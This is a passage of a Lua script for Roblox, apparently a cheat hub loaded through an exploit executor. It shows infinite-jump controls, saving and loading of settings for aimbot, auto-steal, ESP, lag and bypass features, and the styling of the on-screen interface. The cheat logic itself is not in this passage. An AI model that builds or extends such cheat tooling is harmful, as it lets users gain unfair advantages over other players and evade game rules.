    if InfiniteJump.enabled then return end
    InfiniteJump.enabled = true
    _cleanConnectEvents()
end

function InfiniteJump.stop()
    InfiniteJump.enabled = false
    if InfiniteJump.jumpConn then InfiniteJump.jumpConn:Disconnect(); InfiniteJump.jumpConn = nil end
    if InfiniteJump.heartbeatConn then InfiniteJump.heartbeatConn:Disconnect(); InfiniteJump.heartbeatConn = nil end
end

function InfiniteJump.setJumpPower(power)
    power = tonumber(power) or 55
    InfiniteJump.jumpPower = math.clamp(power, 10, 200)
end

function InfiniteJump.isRunning()
    return InfiniteJump.enabled == true
end

-- Wire Blast toggle API → Clean Hub InfiniteJump
startInfJump = function()
    InfiniteJump.start()
end
stopInfJump = function()
    InfiniteJump.stop()
end


-- ============================================================
-- CONFIG SAVE/LOAD
-- ============================================================
local function saveConfig()
    syncStealAliases() -- Ensure Steal's aliases are up-to-date before saving
    pcall(function()
        local g = game:GetService("CoreGui"):FindFirstChild("BlastLagg_UI")
        if not g then
            local pg = LP:FindFirstChild("PlayerGui")
            g = pg and pg:FindFirstChild("BlastLagg_UI")
        end
        if g then
            State.laggerOpen = g.Enabled == true
            local main = g:FindFirstChild("MainFrame")
            if main then
                State.laggerPosition = {
                    XScale = main.Position.X.Scale, XOffset = main.Position.X.Offset,
                    YScale = main.Position.Y.Scale, YOffset = main.Position.Y.Offset,
                }
            end
        end
    end)
    local cfg = {
        NS = SPD.NS, CS = SPD.CS, LAGGER_SPEED = SPD.LAGGER_SPEED, LAGGER_CARRY_SPEED = SPD.LAGGER_CARRY_SPEED, LAGGER_SPEED_1 = SPD.LAGGER_SPEED, LAGGER_SPEED_2 = SPD.LAGGER_CARRY_SPEED,
        stairAssistEnabled = _G.NightHubStairAssist == true,
        stealRadius = Steal.StealRadius, stealDuration = Steal.StealDuration,
        VLESSVSSemiStopPercent = State.VLESSVSSemiStopPercent,
        autoGrabStopEnabled = autoGrabStopEnabled,
        autoGrabStopTime = autoGrabStopTime,
        autoGrabDelayRadius = autoGrabDelayRadius,
        carryKey = Keys.carry.Name, guiHideKey = Keys.guiHide.Name, dropKey = Keys.drop.Name,
        tpDownKey = Keys.tpDown.Name, aimbotKey = Keys.aimbot.Name,
        batBypassKey = Keys.batBypass.Name, batTKey = Keys.batT.Name,
        laggerKey = Keys.lagger.Name, -- Adicionado para salvar a key do lagger
        unwalkKey = Keys.unwalk.Name,
        visionBatKey = Keys.visionBat.Name,
        autoLeftKey = Keys.autoLeft.Name,
        autoRightKey = Keys.autoRight.Name,
        autoStealEnabled = State.autoStealEnabled or autoStealEnabled, selectedStealMode = selectedStealMode or "Normal", selectedSemiMode = selectedSemiMode or "V1", autoStealRadius = tonumber(autoStealRadius) or 70, autoGrabStopTime = tonumber(autoGrabStopTime) or ((_G.AmbitiousSemiSteal and _G.AmbitiousSemiSteal.autoGrabStopTime) or 1.29), syncAfterHitToggle = State.syncAfterHitToggle == true, antiRagdollEnabled = State.antiRagdollEnabled, antiRagdollMode = State.antiRagdollMode or "V1",
        antiDieEnabled = State.antiDieEnabled,
        infJumpEnabled = State.infJumpEnabled, medusaCounterEnabled = State.medusaCounterEnabled, customToolsEnabled = State.customToolsEnabled == true,
        batAimbotToggled = State.batAimbotToggled, noCollideEnabled = State.noCollideEnabled,
        batCounterEnabled = State.batCounterEnabled, unwalkEnabled = State.unwalkEnabled,
        antiLagEnabled = State.antiLagEnabled, uiLocked = State.uiLocked,
        stretchRezEnabled = State.stretchRezEnabled,
        fovEnabled = State.fovEnabled, fovValue = State.fovValue,
        nightModeEnabled = State.nightModeEnabled, removeAccEnabled = State.removeAccEnabled,
        gameTheme = State.gameTheme,
        carryMode = SPD.speedMode, laggerToggled = SPD.laggerToggled, laggerLevel = SPD.laggerLevel, antiDropEnabled = SPD.antiDropEnabled == true,
        AimbotSpeed = State.AimbotSpeed, BypassSpeed = State.BypassSpeed, HitDistance = State.HitDistance, SwingCooldown = State.SwingCooldown,
        aimbotMode = State.aimbotMode, batAimbotVersion = State.batAimbotVersion,
        normalAimbotVersion = State.normalAimbotVersion, bypassAimbotVersion = State.bypassAimbotVersion,
        antiBatEnabled = State.antiBatEnabled, adaptStealMode = State.adaptStealMode, adaptSemiRange = State.adaptSemiRange, adaptNormalPause = State.adaptNormalPause,
        autoSwingEnabled = State.autoSwingEnabled,
        tpBatEnabled = State.tpBatEnabled,
        visionBatToggled = State.visionBatToggled,
        snowTpBatEnabled = State.snowTpBatEnabled == true,
        tpBatMode = State.tpBatMode,
        guiVisible = State.guiVisible,
        guiPosition = State.guiPosition,
        miniGuiPosition = State.miniGuiPosition,
        autoGrabPosition = State.autoGrabPosition,
        lockAutoGrab = State.lockAutoGrab == true,
        mobileButtonPositions = State.mobileButtonPositions,
        mobileButtonScale = State.mobileButtonScale,
        mobileLaggerVisualMode = mobileLaggerVisualMode,
        hideMobileButtons = State.hideMobileButtons, lockMobileButtons = State.lockMobileButtons,
        introEnabled = INTRO.enabled, introMusic = INTRO.music,
        matchEnabled = INTRO.matchEnabled, matchMusic = INTRO.matchMusic,
        headlessEnabled = State.headlessEnabled,
        skinEnabled = State.skinEnabled,
        skinSelection = State.skinSelection,
        korbloxEnabled = State.korbloxEnabled,
        noCamCollisionEnabled = State.noCamCollisionEnabled,
        customFontEnabled = State.customFontEnabled,
        espEnabled = State.espEnabled,
        espMode = State.espMode,
        autoLeftEnabled = State.autoLeftEnabled,
        autoRightEnabled = State.autoRightEnabled,
        currentBackground = State.currentBackground,
        backgroundColorEnabled = State.backgroundColorEnabled,
        backgroundColor = State.backgroundColor,
        uiScale = State.uiScale,
        progressBarScale = State.progressBarScale,
        laggerUiScale = State.laggerUiScale,
        laggerOpen = State.laggerOpen,
        laggerPosition = State.laggerPosition,
        animationPack = State.animationPack,
    }
    local ok, enc = pcall(function() return HttpService:JSONEncode(cfg) end)
    if ok and enc then pcall(function() _writefile(CONFIG_FILE, enc) end) end
end

local function loadConfig()
    local has = false
    pcall(function() has = _isfile(CONFIG_FILE) end)
    if not has then return end
    local raw
    pcall(function() raw = _readfile(CONFIG_FILE) end)
    if not raw then return end
    local cfg
    local ok = pcall(function() cfg = HttpService:JSONDecode(raw) end)
    if not ok or not cfg then return end
    if cfg.batBypassKey and Enum.KeyCode[cfg.batBypassKey] then Keys.batBypass = Enum.KeyCode[cfg.batBypassKey] end
    if cfg.batTKey and Enum.KeyCode[cfg.batTKey] then Keys.batT = Enum.KeyCode[cfg.batTKey] end
    if cfg.NS then SPD.NS = cfg.NS end
    if cfg.CS then SPD.CS = cfg.CS end
    if cfg.LAGGER_SPEED then
        SPD.LAGGER_SPEED = cfg.LAGGER_SPEED
        SPD.LAGGER_SPEED_1 = cfg.LAGGER_SPEED
    elseif cfg.LAGGER_SPEED_1 then
        SPD.LAGGER_SPEED = cfg.LAGGER_SPEED_1
        SPD.LAGGER_SPEED_1 = cfg.LAGGER_SPEED_1
    end
    if cfg.LAGGER_CARRY_SPEED then
        SPD.LAGGER_CARRY_SPEED = cfg.LAGGER_CARRY_SPEED
        SPD.LAGGER_SPEED_2 = cfg.LAGGER_CARRY_SPEED
    elseif cfg.LAGGER_SPEED_2 then
        SPD.LAGGER_CARRY_SPEED = cfg.LAGGER_SPEED_2
        SPD.LAGGER_SPEED_2 = cfg.LAGGER_SPEED_2
    end
    if cfg.stairAssistEnabled ~= nil then _G.NightHubStairAssist = cfg.stairAssistEnabled == true end
    if cfg.stealRadius then Steal.StealRadius = cfg.stealRadius end
    if cfg.stealDuration then Steal.StealDuration = cfg.stealDuration end
    if cfg.VLESSVSSemiStopPercent then State.VLESSVSSemiStopPercent = math.clamp(tonumber(cfg.VLESSVSSemiStopPercent) or 75, 1, 100) end
    if cfg.autoGrabStopEnabled ~= nil then 
        autoGrabStopEnabled = cfg.autoGrabStopEnabled 
    end
    if cfg.autoGrabStopTime then 
        autoGrabStopTime = cfg.autoGrabStopTime 
    end
    if cfg.autoGrabDelayRadius then 
        autoGrabDelayRadius = math.clamp(tonumber(cfg.autoGrabDelayRadius) or 8, 0.1, 500)
        _G.autoGrabDelayRadius = autoGrabDelayRadius
        if _G.AmbitiousSemiV2Steal then _G.AmbitiousSemiV2Steal.autoGrabSetDelayRadius = autoGrabDelayRadius end
    end
    if cfg.autoStealEnabled ~= nil then
        State.autoStealEnabled = cfg.autoStealEnabled == true
        autoStealEnabled = State.autoStealEnabled
        Steal.AutoStealEnabled = State.autoStealEnabled
        _G.autoStealEnabled = State.autoStealEnabled
    end
    if cfg.selectedStealMode == "Normal" or cfg.selectedStealMode == "Semi" then
        selectedStealMode = cfg.selectedStealMode
        _G.selectedStealMode = selectedStealMode
    end
    if cfg.selectedSemiMode ~= nil then
        selectedSemiMode = cfg.selectedSemiMode == "V2" and "V2" or "V1"
        _G.selectedSemiMode = selectedSemiMode
    end
    if cfg.autoGrabStopTime then
        autoGrabStopTime = tonumber(cfg.autoGrabStopTime) or autoGrabStopTime
        _G.AmbitiousSemiSteal = _G.AmbitiousSemiSteal or {}
        _G.AmbitiousSemiSteal.autoGrabStopTime = autoGrabStopTime
    end
    if cfg.autoStealRadius then
        autoStealRadius = tonumber(cfg.autoStealRadius) or autoStealRadius
        _G.autoStealRadius = autoStealRadius
        Steal.StealRadius = autoStealRadius
    end
    if cfg.syncAfterHitToggle ~= nil then State.syncAfterHitToggle = cfg.syncAfterHitToggle == true end
    State.syncAfterHitEnabled = State.syncAfterHitToggle == true
    if cfg.antiRagdollEnabled ~= nil then State.antiRagdollEnabled = cfg.antiRagdollEnabled end
    if cfg.antiRagdollMode == "V1" or cfg.antiRagdollMode == "V2" then State.antiRagdollMode = cfg.antiRagdollMode end
    if cfg.antiDieEnabled ~= nil then State.antiDieEnabled = cfg.antiDieEnabled == true end
    if cfg.infJumpEnabled ~= nil then State.infJumpEnabled = cfg.infJumpEnabled end
    if cfg.medusaCounterEnabled ~= nil then State.medusaCounterEnabled = cfg.medusaCounterEnabled end
    if cfg.customToolsEnabled ~= nil then State.customToolsEnabled = cfg.customToolsEnabled == true end
    if cfg.antiMedusaEnabled ~= nil then State.antiMedusaEnabled = cfg.antiMedusaEnabled end
    if cfg.batAimbotToggled ~= nil then State.batAimbotToggled = cfg.batAimbotToggled end
    if cfg.noCollideEnabled ~= nil then State.noCollideEnabled = cfg.noCollideEnabled end
    if cfg.batCounterEnabled ~= nil then State.batCounterEnabled = cfg.batCounterEnabled end
    if cfg.unwalkEnabled ~= nil then State.unwalkEnabled = cfg.unwalkEnabled end
    if cfg.antiLagEnabled ~= nil then State.antiLagEnabled = cfg.antiLagEnabled end
    if cfg.uiLocked ~= nil then State.uiLocked = cfg.uiLocked end
    if cfg.stretchRezEnabled ~= nil then State.stretchRezEnabled = cfg.stretchRezEnabled end
    if cfg.fovEnabled ~= nil then State.fovEnabled = cfg.fovEnabled == true end
    if cfg.fovValue ~= nil then State.fovValue = math.clamp(tonumber(cfg.fovValue) or 70, 30, 120) end
    if cfg.nightModeEnabled ~= nil then State.nightModeEnabled = cfg.nightModeEnabled end
    if cfg.gameTheme ~= nil then
        if type(cfg.gameTheme) == "string" then
            State.gameTheme = cfg.gameTheme
        else
            State.gameTheme = "Off"
        end
    end
    if cfg.removeAccEnabled ~= nil then State.removeAccEnabled = cfg.removeAccEnabled end
    if cfg.carryMode ~= nil then SPD.speedMode = cfg.carryMode end
    if cfg.antiDropEnabled ~= nil then SPD.antiDropEnabled = cfg.antiDropEnabled == true end
    if cfg.laggerToggled ~= nil then SPD.laggerToggled = cfg.laggerToggled end
    if cfg.laggerLevel then SPD.laggerLevel = cfg.laggerLevel end
    if cfg.AimbotSpeed then State.AimbotSpeed = cfg.AimbotSpeed end
    if tonumber(cfg.BypassSpeed) and tonumber(cfg.BypassSpeed) > 0 then
        State.BypassSpeed = tonumber(cfg.BypassSpeed)
    end
    if cfg.tpBatEnabled ~= nil then State.tpBatEnabled = cfg.tpBatEnabled end
    if cfg.visionBatToggled ~= nil then State.visionBatToggled = cfg.visionBatToggled end
    if cfg.snowTpBatEnabled ~= nil then State.snowTpBatEnabled = cfg.snowTpBatEnabled == true end
    if cfg.tpBatMode == "v1" or cfg.tpBatMode == "v2" then State.tpBatMode = cfg.tpBatMode end
    if cfg.visionBatKey and Enum.KeyCode[cfg.visionBatKey] then Keys.visionBat = Enum.KeyCode[cfg.visionBatKey] end
    if cfg.autoLeftKey and Enum.KeyCode[cfg.autoLeftKey] then Keys.autoLeft = Enum.KeyCode[cfg.autoLeftKey] end
    if cfg.autoRightKey and Enum.KeyCode[cfg.autoRightKey] then Keys.autoRight = Enum.KeyCode[cfg.autoRightKey] end
    if cfg.HitDistance then State.HitDistance = cfg.HitDistance end
    if cfg.SwingCooldown then State.SwingCooldown = cfg.SwingCooldown end
    if cfg.guiPosition then State.guiPosition = cfg.guiPosition end
    if cfg.hideMobileButtons ~= nil then 
        State.hideMobileButtons = cfg.hideMobileButtons 
        _G._VezyHideSideBtns = cfg.hideMobileButtons
    end
    if cfg.lockMobileButtons ~= nil then State.lockMobileButtons = cfg.lockMobileButtons end
    if cfg.aimbotMode then State.aimbotMode = cfg.aimbotMode end
    if cfg.batAimbotVersion == "v1" or cfg.batAimbotVersion == "v2" or cfg.batAimbotVersion == "v3" or cfg.batAimbotVersion == "v4" then State.batAimbotVersion = cfg.batAimbotVersion end
    if cfg.normalAimbotVersion == "v1" or cfg.normalAimbotVersion == "v2" or cfg.normalAimbotVersion == "v3" or cfg.normalAimbotVersion == "v4" then
        State.normalAimbotVersion = cfg.normalAimbotVersion
    else
        State.normalAimbotVersion = State.batAimbotVersion
    end
    if cfg.bypassAimbotVersion == "v1" or cfg.bypassAimbotVersion == "v2" or cfg.bypassAimbotVersion == "v3" or cfg.bypassAimbotVersion == "v4" then
        State.bypassAimbotVersion = cfg.bypassAimbotVersion
    else
        State.bypassAimbotVersion = State.batAimbotVersion
    end
    if cfg.antiBatEnabled ~= nil then State.antiBatEnabled = cfg.antiBatEnabled == true end
    if cfg.adaptStealMode == "NORMAL" or cfg.adaptStealMode == "SEMI" then State.adaptStealMode = cfg.adaptStealMode end
    if cfg.adaptSemiRange then State.adaptSemiRange = tonumber(cfg.adaptSemiRange) or 10 end
    if cfg.adaptNormalPause then State.adaptNormalPause = tonumber(cfg.adaptNormalPause) or 65 end
    if cfg.autoSwingEnabled ~= nil then State.autoSwingEnabled = cfg.autoSwingEnabled == true end
    if cfg.guiVisible ~= nil then State.guiVisible = cfg.guiVisible == true end
    if type(cfg.miniGuiPosition) == "table" then State.miniGuiPosition = cfg.miniGuiPosition end
    if type(cfg.autoGrabPosition) == "table" then State.autoGrabPosition = cfg.autoGrabPosition end
    if cfg.lockAutoGrab ~= nil then State.lockAutoGrab = cfg.lockAutoGrab == true end
    if type(cfg.mobileButtonPositions) == "table" then State.mobileButtonPositions = cfg.mobileButtonPositions end
    if cfg.mobileLaggerVisualMode == "lagger" or cfg.mobileLaggerVisualMode == "carryLagger" then
        mobileLaggerVisualMode = cfg.mobileLaggerVisualMode
    end
    if cfg.headlessEnabled ~= nil then State.headlessEnabled = cfg.headlessEnabled == true end
    if cfg.skinEnabled ~= nil then State.skinEnabled = cfg.skinEnabled == true end
    if cfg.skinSelection ~= nil then State.skinSelection = math.max(math.floor(tonumber(cfg.skinSelection) or 1), 1) end -- Upper bound validated against SKIN_LIST below.
    if cfg.korbloxEnabled ~= nil then State.korbloxEnabled = cfg.korbloxEnabled == true end
    if cfg.introEnabled ~= nil then INTRO.enabled = cfg.introEnabled end
    if cfg.introMusic and INTRO.OPTIONS[cfg.introMusic] then INTRO.music = cfg.introMusic end
    if cfg.matchEnabled ~= nil then INTRO.matchEnabled = cfg.matchEnabled == true end
    if cfg.matchMusic and INTRO.MATCH_OPTIONS and INTRO.MATCH_OPTIONS[cfg.matchMusic] then INTRO.matchMusic = cfg.matchMusic end
    if cfg.noCamCollisionEnabled ~= nil then State.noCamCollisionEnabled = cfg.noCamCollisionEnabled end
    if cfg.customFontEnabled ~= nil then State.customFontEnabled = cfg.customFontEnabled end
    if cfg.espEnabled ~= nil then State.espEnabled = cfg.espEnabled end
    if cfg.espMode then State.espMode = cfg.espMode end
    if cfg.autoLeftEnabled ~= nil then State.autoLeftEnabled = cfg.autoLeftEnabled end
    if cfg.autoRightEnabled ~= nil then State.autoRightEnabled = cfg.autoRightEnabled end
    if cfg.currentBackground ~= nil then
        State.currentBackground = math.clamp(math.floor(tonumber(cfg.currentBackground) or 1), 1, #MISERY_BACKGROUND_IDS)
    end
    if cfg.backgroundColorEnabled ~= nil then State.backgroundColorEnabled = cfg.backgroundColorEnabled == true end
    if type(cfg.backgroundColor) == "string" then
        -- Force pink theme: map purple/old accents to PINK
        local name = string.upper(cfg.backgroundColor)
        if name == "PURPLE" or name == "VIOLET" then name = "PINK" end
        State.backgroundColor = name
    end
    if cfg.uiScale ~= nil then
        State.uiScale = math.clamp(tonumber(cfg.uiScale) or DEFAULT_GUI_SCALE, 0.50, 1.50)
    end
    if cfg.progressBarScale ~= nil then
        State.progressBarScale = math.clamp(tonumber(cfg.progressBarScale) or 1, 0.50, 1.50)
    end
    if cfg.mobileButtonScale ~= nil then
        State.mobileButtonScale = math.clamp(tonumber(cfg.mobileButtonScale) or 1, 0.50, 2.50)
    end
    if cfg.laggerUiScale ~= nil then
        State.laggerUiScale = math.clamp(tonumber(cfg.laggerUiScale) or 1, 0.50, 1.50)
    end
    if cfg.laggerOpen ~= nil then State.laggerOpen = cfg.laggerOpen == true end
    if type(cfg.laggerPosition) == "table" then State.laggerPosition = cfg.laggerPosition end
    if type(cfg.animationPack) == "string" then State.animationPack = cfg.animationPack end
    -- Sync Steal's aliases after loading config
    syncStealAliases()
    
    local function tryKey(field, kt)
        if cfg[field] and Enum.KeyCode[cfg[field]] then Keys[kt] = Enum.KeyCode[cfg[field]] end
    end
    tryKey("carryKey","carry") tryKey("laggerKey","lagger") tryKey("guiHideKey","guiHide") tryKey("dropKey","drop")
    tryKey("tpDownKey","tpDown") tryKey("aimbotKey","aimbot") tryKey("unwalkKey","unwalk")
end

-- Carrega config ANTES de construir a UI para que os valores salvos
-- aparecam ja preenchidos nos toggles, input boxes e speed boxes
loadConfig()
applyTheme()
if State.noCamCollisionEnabled then
    applyNoCamCollision(true)
end
if State.espEnabled then
    ESP.start()
end
-- If aimbot is enabled, disable autoLeft/autoRight
if State.batAimbotToggled then
    State.autoLeftEnabled = false
    State.autoRightEnabled = false
end
-- Start autoLeft/autoRight if enabled
-- (guardado: as funções só são definidas mais abaixo; o CharSetup as inicia no spawn)
if State.autoLeftEnabled and startAutoLeft then
    startAutoLeft()
end
if State.autoRightEnabled and startAutoRight then
    startAutoRight()
end
if INTRO.enabled then
    task.spawn(INTRO.play)
end
if INTRO.matchEnabled and not INTRO.enabled then
    task.delay(0.2, function()
        if INTRO.matchEnabled and INTRO.playMatch then INTRO.playMatch() end
    end)
end

-- Atualiza os botões do ESP Mode após criar a UI
task.defer(function()
    if modeNoLineBtn and modeWithLineBtn then
        if State.espMode == "noLine" then
            modeNoLineBtn.BackgroundColor3 = C.accent
            modeWithLineBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
        else
            modeWithLineBtn.BackgroundColor3 = C.accent
            modeNoLineBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
        end
    end
end)

-- ============================================================
-- CLEANUP + ROOT GUI
-- ============================================================
for _,name in pairs({"noxyHubV5_3","noxyhubV5_3"}) do
    pcall(function() local o=game:GetService("CoreGui"):FindFirstChild(name); if o then o:Destroy() end end)
    pcall(function() local o=LP:WaitForChild("PlayerGui"):FindFirstChild(name); if o then o:Destroy() end end)
end

local gui = Instance.new("ScreenGui")
gui.Name = "noxyHubV5_3"
gui.ResetOnSpawn = false
gui.DisplayOrder = 999
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
pcall(function() if syn and syn.protect_gui then syn.protect_gui(gui) end end)
pcall(function() gui.Parent = getSafeGuiParent() end)
if not gui.Parent then pcall(function() gui.Parent = LP:WaitForChild("PlayerGui", 5) or LP.PlayerGui end) end

-- ============================================================
-- COLORS (PINK principal + roxo complementar nos detalhes)
-- ============================================================
local C = {
    bg          = Color3.fromRGB(24, 18, 16),    -- fundo dark com base laranja suave
    panel       = Color3.fromRGB(36, 26, 22),   -- paineis com tom suave
    card        = Color3.fromRGB(44, 32, 28),    -- cards mobile-friendly
    cardHov     = Color3.fromRGB(60, 42, 36),   -- hover com elevacao
    border      = Color3.fromRGB(235, 35, 45),  -- red accent #EB232D
    borderDim   = Color3.fromRGB(110, 110, 115),   -- laranja suave
    text        = Color3.fromRGB(255, 255, 255),
    textSub     = Color3.fromRGB(245, 235, 230),
    textDim     = Color3.fromRGB(210, 180, 170),
    accent      = Color3.fromRGB(235, 35, 45),  -- red accent #EB232D
    pillOff     = Color3.fromRGB(55, 38, 32),
    pillOn      = Color3.fromRGB(235, 35, 45),  -- red active
    dotOff      = Color3.fromRGB(220, 190, 180),
    dotOn       = Color3.fromRGB(255, 255, 255),
    header      = Color3.fromRGB(30, 22, 18),
    chipBg      = Color3.fromRGB(55, 38, 32),
    chipText    = Color3.fromRGB(255, 255, 255),
}

-- ============================================================
-- UI HELPERS
-- ============================================================
local function mkCorner(p,r) local c=Instance.new("UICorner",p); c.CornerRadius=UDim.new(0,r or 8); return c end
local function mkStroke(p,col,th,transparency)
    local s=Instance.new("UIStroke",p)
    s.Color=col or C.border
    s.Thickness=th or 1.2
    s.Transparency=transparency == nil and 0.22 or transparency
    s.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
    local g=Instance.new("UIGradient",s)
    -- Contorno rosa → roxo → rosa (reluzente, visivel)
    if State.colorApi and State.colorApi.strokeSequence then
        g.Color = State.colorApi.strokeSequence(State.colorApi.accent or C.accent)
        if State.colorApi.gradients then
            local agr = State.colorApi.gradients
            agr[#agr+1] = g
        end
    else
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, C.accent),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 65, 75)),
            ColorSequenceKeypoint.new(1, C.accent),
        })
    end
    g.Transparency=NumberSequence.new({
        NumberSequenceKeypoint.new(0,0.35),
        NumberSequenceKeypoint.new(0.5,0.05),
        NumberSequenceKeypoint.new(1,0.35),
    })
    return s
end
local function styleXzzRow(row)
    -- Estilo Kuru: card escuro semi-invisivel, canto 9, borda sutil, gradiente vertical
    row.BackgroundColor3 = Color3.fromRGB(16, 17, 20)
    row.BackgroundTransparency = 0.5
    mkCorner(row, 9)
    local g = Instance.new("UIGradient", row)
    g.Color = ColorSequence.new(Color3.fromRGB(20, 21, 25), Color3.fromRGB(13, 14, 17))
    g.Rotation = 90
    g.Transparency = NumberSequence.new(0.08, 0.08)
    local st = Instance.new("UIStroke", row)
    st.Color = Color3.fromRGB(34, 37, 43)
    st.Thickness = 1
    st.Transparency = 0.4
    st.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    return st
end

local function styleWhiteValueBox(valBox, valWrap)
    valBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    valBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
    valBox.TextTransparency = 0
    valBox.TextStrokeTransparency = 1
    valBox.Font = Enum.Font.GothamBlack
    valBox.TextSize = 13
    valBox.ZIndex = 14
    valBox.Active = true
    valBox.Selectable = true
    if valWrap then
        valWrap.ZIndex = 12
        valWrap.BackgroundColor3 = C.panel
        valWrap.BackgroundTransparency = 0.05
        valWrap.Active = true
    end

    -- Overlay is visual-only and must NEVER block TextBox clicks
    local overlay = Instance.new("TextLabel")
    overlay.Name = "WhiteValue"
    overlay.BackgroundTransparency = 1
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.Text = valBox.Text
    overlay.TextColor3 = Color3.fromRGB(255, 255, 255)
    overlay.TextTransparency = 1 -- TextBox itself shows the value
    overlay.TextStrokeTransparency = 1
    overlay.Font = Enum.Font.GothamBlack
    overlay.TextSize = 13
    overlay.ZIndex = 13
    overlay.Active = false
    overlay.Selectable = false
    overlay.Parent = valWrap or valBox.Parent

    valBox:GetPropertyChangedSignal("Text"):Connect(function()
        if overlay and overlay.Parent then overlay.Text = valBox.Text end
    end)
    return overlay
end

local function makeDraggable(frame, handle, force, positionStateKey)
    local Dragger = {
        src = handle or frame,
        dragging = false,
        dragInput = nil,
        dragStart = nil,
        startPos = nil,
        moved = false,
    }
    Dragger.src.InputBegan:Connect(function(inp)
        if State.uiLocked and not force then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
            Dragger.dragging = true
            Dragger.moved = false
            Dragger.dragStart = inp.Position
            Dragger.startPos = frame.Position
            inp.Changed:Connect(function()
                if inp.UserInputState == Enum.UserInputState.End then
                    Dragger.dragging = false
                    if Dragger.moved and positionStateKey then
                        State[positionStateKey] = _G.BlastPositionToConfig(frame.Position)
                        task.spawn(saveConfig)
                    end
                end
            end)
        end
    end)
    Dragger.src.InputChanged:Connect(function(inp)
        if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then
            Dragger.dragInput = inp
        end
    end)
    trackConn(UIS.InputChanged:Connect(function(inp)
        if inp == Dragger.dragInput and Dragger.dragging and (force or not State.uiLocked) then
            local dx = inp.Position.X - Dragger.dragStart.X
            local dy = inp.Position.Y - Dragger.dragStart.Y
            frame.Position = UDim2.new(
                Dragger.startPos.X.Scale,
                Dragger.startPos.X.Offset + dx,
                Dragger.startPos.Y.Scale,
                Dragger.startPos.Y.Offset + dy
            )
            Dragger.moved = true
            if positionStateKey then State[positionStateKey] = _G.BlastPositionToConfig(frame.Position) end
        end
    end))
end

-- ============================================================
-- MAIN WINDOW
-- ============================================================
local WIN_W = 320
local WIN_H = 520
local HEADER_H = 96
local TAB_BAR_H = 70
local TAB_TOP_GAP = 4 -- Abas logo abaixo do header
local CONTENT_TOP = HEADER_H + TAB_BAR_H + TAB_TOP_GAP + 4
local CONTENT_BOTTOM_GAP = 10
local mainOuter, miniBtn, mainUiScale, bgImage, logoImg
local StealProgressBar -- criada no fim do arquivo; declarada aqui para o controle de escala

local function applyMiseryBackground(index, noSave)
    index = math.clamp(math.floor(tonumber(index) or 0), 0, #MISERY_BACKGROUND_IDS)
    State.currentBackground = index
    local imageId = MISERY_BACKGROUND_IDS[index]
    if mainOuter then mainOuter.BackgroundColor3 = C.bg end
    if bgImage then
        if index == 0 or not imageId then
            bgImage.Visible = false
            bgImage.Image = ""
        else
            bgImage.Image = "rbxassetid://" .. imageId
            bgImage.Visible = true
        end
    end
    -- Todos os Mobile Buttons acompanham o background selecionado na GUI.
    for _, buttonData in pairs(mobileButtons) do
        local button = buttonData and buttonData.btn
        local picture = button and button:FindFirstChild("BackgroundPicture")
        if picture then
            if index == 0 or not imageId then
                picture.Image = ""
                picture.Visible = false
            else
                picture.Image = "rbxassetid://" .. imageId
                picture.Visible = true
            end
        end
    end
    if not noSave then task.spawn(saveConfig) end
end

-- ============================================================
-- BACKGROUND COLOR (portado da Adapt UI - createColorThemePicker)
-- Tudo em State.colorApi para nao criar locals no chunk principal
-- (o script esta proximo do limite de 200 locals do Luau)
-- ============================================================
State.colorApi = {
    COLORS = {
        {name = "NONE",   color = Color3.fromRGB(35,  35,  35)},
        {name = "PURPLE", color = Color3.fromRGB(140, 40, 250)},
        {name = "BLUE",   color = Color3.fromRGB(58,  128, 245)},
        {name = "RED",    color = Color3.fromRGB(255, 40,  40)},
        {name = "WHITE",  color = Color3.fromRGB(255, 255, 255)},
        {name = "YELLOW", color = Color3.fromRGB(255, 214, 0)},
        {name = "GREY",   color = Color3.fromRGB(13,  13,  13)},
        {name = "WHITE",  color = Color3.fromRGB(255, 255, 255)},
        {name = "FOREST", color = Color3.fromRGB(95, 215, 140)},
    },
    accent = Color3.fromRGB(235, 35, 45), -- red accent
    gradients = {}, -- gradientes de contorno criados pelo mkStroke
    knobs = {}, -- bolinhas dos toggles que seguem a cor da paleta
    tags = State.colorTags, -- textos do head label (discord .gg + Spd) que seguem a cor
}

function State.colorApi.getSelected()
    local sel = State.backgroundColor
    if sel == "NONE" or sel == "None" then
        return Color3.fromRGB(235, 35, 45)
    end
    for _, entry in ipairs(State.colorApi.COLORS) do
        if entry.name == sel then return entry.color end
    end
    return Color3.fromRGB(235, 35, 45)
end

function State.colorApi.strokeSequence(accent)
    local hi = Color3.fromRGB(255, 65, 75)
    local lo = accent or Color3.fromRGB(235, 35, 45)
    return ColorSequence.new({
        ColorSequenceKeypoint.new(0, lo),
        ColorSequenceKeypoint.new(0.5, hi),
        ColorSequenceKeypoint.new(1, lo),
    })
end

function State.colorApi.apply(noSave)
    local api = State.colorApi
    local selectedColor = api.getSelected()
    -- Background da GUI: so muda se o toggle "Background Color" estiver ligado
    local bgTint = (State.backgroundColorEnabled and State.backgroundColor ~= "NONE") and selectedColor or Color3.fromRGB(255, 255, 255)
    local tweenInfo = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    if bgImage then
        pcall(function()
            TweenService:Create(bgImage, tweenInfo, {ImageColor3 = bgTint}):Play()
        end)
    end
    -- Texto/logo MISERY muda sempre (aparte do toggle da background),
    -- inclusive o mini botao de restaurar (mesma imagem da Misery)
    if logoImg then
        pcall(function()
            TweenService:Create(logoImg, tweenInfo, {ImageColor3 = selectedColor}):Play()
        end)
    end
    if miniBtn then
        pcall(function()
            TweenService:Create(miniBtn, tweenInfo, {ImageColor3 = selectedColor}):Play()
        end)
    end
    -- Contorno branco dos botoes/rows da GUI muda junto com a cor
    -- (os textos continuam brancos)
    api.accent = selectedColor
